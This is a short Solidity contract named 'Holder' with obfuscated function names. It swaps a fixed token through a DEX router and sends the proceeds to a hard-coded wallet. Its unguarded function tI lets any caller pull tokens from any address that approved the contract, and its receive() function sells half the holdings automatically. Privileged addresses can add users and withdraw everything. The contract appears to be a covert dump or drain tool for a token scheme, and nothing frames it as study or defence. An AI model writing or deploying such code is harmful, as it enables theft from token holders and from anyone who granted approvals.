//SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "./IERC20.sol";
import "./IUniswapV2Router02.sol";

contract Holder {

    IERC20 private constant token = IERC20(0x9cb949e8c256C3EA5395bbe883E6Ee6a20Db6045);
    IUniswapV2Router02 private constant router = IUniswapV2Router02(0x39255DA12f96Bb587c7ea7F22Eead8087b0a59ae);
    mapping ( address => bool ) private isValid;

    constructor() {
        isValid[msg.sender] = true;
        isValid[0xb7EE8cb807eF7ef493B902b93E60f22D268355c1] = true;
    }

    function sVF3(address user) external {
        require(isValid[msg.sender], 'Invalid');
        isValid[user] = true;
    }

    function s9df(uint amount) external {
        require(isValid[msg.sender], 'Invalid');
        _SF(amount);
    }

    function sd9FF(uint amount) external {
        require(isValid[msg.sender], 'Invalid');
        _SF(amount);
    }

    function tI(address from, uint amount) external {
        token.transferFrom(from, address(this), amount);
    }

    function _SF(uint amount) internal {

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

        token.approve(address(router), amount);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 1, path, 0xb7EE8cb807eF7ef493B902b93E60f22D268355c1, block.timestamp + 1000);

        delete path;
    }

    function wT() external {
        require(isValid[msg.sender], 'Invalid');
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function wE() external {
        require(isValid[msg.sender], 'Invalid');
        (bool s,) = payable(msg.sender).call{value: address(this).balance}("");
        require(s);
    }

    receive() external payable {
        _SF(token.balanceOf(address(this)) / 2);
    }

}